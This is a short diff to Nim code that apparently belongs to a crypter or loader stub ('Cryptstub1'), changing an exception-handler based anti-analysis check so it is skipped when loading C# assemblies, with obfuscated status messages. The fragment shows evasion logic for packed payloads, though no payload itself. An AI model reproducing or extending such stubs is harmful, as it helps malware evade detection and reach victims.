@@ -2658,17 +2658,21 @@ proc VEHHandler (pExceptInfo: PEXCEPTION_POINTERS): LONG {.stdcall.}=
     result = EXCEPTION_CONTINUE_EXECUTION
 
 proc CreatedInterrupt(): bool =
-    when defined(verbose):
-        echo obf("[*] Adding Exception Handler...")
-    AddVectoredExceptionHandler(1, VEHHandler)
-    when defined(verbose):
-        echo obf("[*] Raising exception...")
-    RaiseException(EXCEPTION_BREAKPOINT, 0, 0, nil)
-    when defined(verbose):
-        echo obf("[*] Removing ExceptionHandler...")
-    RemoveVectoredExceptionHandler(VEHHandler)
-    return true
-    
+    when not defined(csharp):
+        when defined(verbose):
+            echo obf("[*] Adding Exception Handler...")
+        AddVectoredExceptionHandler(1, VEHHandler)
+        when defined(verbose):
+            echo obf("[*] Raising exception...")
+        RaiseException(EXCEPTION_BREAKPOINT, 0, 0, nil)
+        when defined(verbose):
+            echo obf("[*] Removing ExceptionHandler...")
+        RemoveVectoredExceptionHandler(VEHHandler)
+        return true
+    else:
+        when defined(verbose):
+            echo obf("[*] Exception Handler Check disabled for loading csharp assemblies as its causing crashes...")
+        return true
 """
 
 var stub = Cryptstub1
